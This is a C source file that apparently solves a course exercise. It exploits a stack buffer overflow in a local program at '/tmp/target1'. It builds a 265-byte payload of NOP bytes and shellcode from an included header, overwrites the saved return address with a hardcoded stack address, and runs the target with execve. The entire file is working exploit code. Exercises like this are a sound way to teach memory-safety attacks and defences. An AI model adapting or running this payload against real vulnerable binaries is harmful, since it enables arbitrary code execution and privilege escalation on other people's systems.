#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"



int main(void)
{

  char* payload = (char*) malloc(sizeof(char) * 265); // 265: 256 bytes for buffer + 4 bytes for %ebp + 4 bytes for return address + 1 byte for '\0'
  memset(payload, 0x90, 265); // set whole payload nop
  memcpy(payload+50, shellcode, sizeof(shellcode)-1); // copy shellcode into payload (-1 is for null terminator)
  payload[264] = '\0'; // null terminator
  memcpy(payload+260, "\x5c\xfc\xff\xbf", 4); // ptr to a nop in payload
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };


  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

